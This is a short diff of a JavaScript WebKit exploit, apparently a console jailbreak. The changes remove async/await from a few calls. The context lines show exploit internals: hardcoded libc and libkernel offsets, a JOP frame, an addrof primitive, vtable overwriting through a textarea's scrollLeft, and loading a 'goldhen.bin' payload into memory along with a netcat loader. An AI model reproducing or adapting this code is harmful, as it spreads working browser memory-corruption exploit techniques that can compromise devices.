@@ -142,9 +142,9 @@ var infloop_addr = libc_base+0x447a0;
 var jop_frame_addr = libc_base+0x715d0;
 var get_errno_addr_addr = libkernel_base+0x9ff0;
 var pthread_create_addr = libkernel_base+0xf980;
-async function pivot(buf)
+function pivot(buf)
 {
-    var ans = await malloc(0x400);
+    var ans = malloc(0x400);
     function set_vtable(ptr) {
         write_ptr_at(addrof(tarea) + 0x18, ptr);
         tarea.scrollLeft = 0;
@@ -806,7 +806,7 @@ async function getHen() {
     let info = await getfile("goldhen.bin");
     window.HEN_data_len = info.len;
     window.HEN_data = await malloc(window.HEN_data_len+1000);
-    await write_mem(window.HEN_data, info.data);
+    write_mem(window.HEN_data, info.data);
     await sleep(150);
         let r = await jb();
         if(r==0){
@@ -843,7 +843,7 @@ async function loader(path){
     window.ldr_bin_2 = malloc(window.ldr_bin_2_len);
     write_mem(window.ldr_bin_2,info2.data);
     await sleep(100);
-    await netcat();
+    netcat();
     display("注入文件:\n"+path);
 }
 window.WEBKIT_Exploit=1;
